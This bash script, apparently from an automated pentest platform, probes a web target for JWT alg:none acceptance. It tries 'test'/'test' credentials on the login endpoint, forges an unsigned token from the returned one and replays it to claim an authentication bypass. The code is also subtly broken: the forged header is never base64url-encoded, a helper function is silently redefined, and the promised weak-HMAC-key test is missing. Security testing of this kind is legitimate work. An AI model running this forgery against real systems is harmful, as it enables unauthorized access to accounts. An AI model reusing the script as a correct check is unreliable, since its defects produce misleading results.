#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        JWT Algorithm Confusion (none/HS256)
# Description: Tests JWT for alg:none acceptance and weak HMAC keys
# Severity:    HIGH
# Category:    Broken Access Control & Authentication
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: JWT Algorithm Confusion (none/HS256)\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
# find a JWT from login or API
TOKEN=$(curl -s -X POST -H "Content-Type: application/json" -d '{"username":"test","password":"test"}' --max-time 10 "$T/api/login" 2>/dev/null | grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*" | head -1)
if [ -z "$TOKEN" ]; then
  TOKEN=$(curl -s --max-time 10 "$T/api/user" -H "Authorization: Bearer test" 2>/dev/null | grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*" | head -1)
fi
if [ -n "$TOKEN" ]; then
  # decode header
  HEADER=$(echo "$TOKEN" | cut -d. -f1 | tr '_-' '/+' | base64 -d 2>/dev/null)
  ALG=$(echo "$HEADER" | grep -o '"alg":"[^"]*"' | cut -d'"' -f4)
  if [ "$ALG" = "none" ]; then
    emit "{\"title\":\"JWT uses alg:none\",\"severity\":\"critical\",\"description\":\"JWT token uses alg:none — signature can be stripped and claims forged.\",\"remediation\":\"Never accept alg:none. Whitelist allowed algorithms server-side.\",\"cweId\":\"CWE-347\",\"owaspCategory\":\"A02:2025-Cryptographic Failures\"}"
  fi
  # try alg:none forgery
  FORGED_HEADER=$(printf '{"alg":"none","typ":"JWT"}' | tr '+/' '-_' | tr -d '=' | tr -d '\n')
  PAYLOAD=$(echo "$TOKEN" | cut -d. -f2)
  FORGED="$FORGED_HEADER.$PAYLOAD."
  R=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $FORGED" --max-time 10 "$T/api/user" 2>/dev/null)
  if [ "$R" = "200" ]; then
    emit "{\"title\":\"JWT alg:none forgery accepted\",\"severity\":\"critical\",\"description\":\"Forged JWT with alg:none and stripped signature is accepted (HTTP 200). Full authentication bypass.\",\"remediation\":\"Reject unsigned tokens. Verify signature with expected algorithm explicitly.\",\"cweId\":\"CWE-347\",\"owaspCategory\":\"A07:2025-Identification and Authentication Failures\"}"
  fi
fi

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
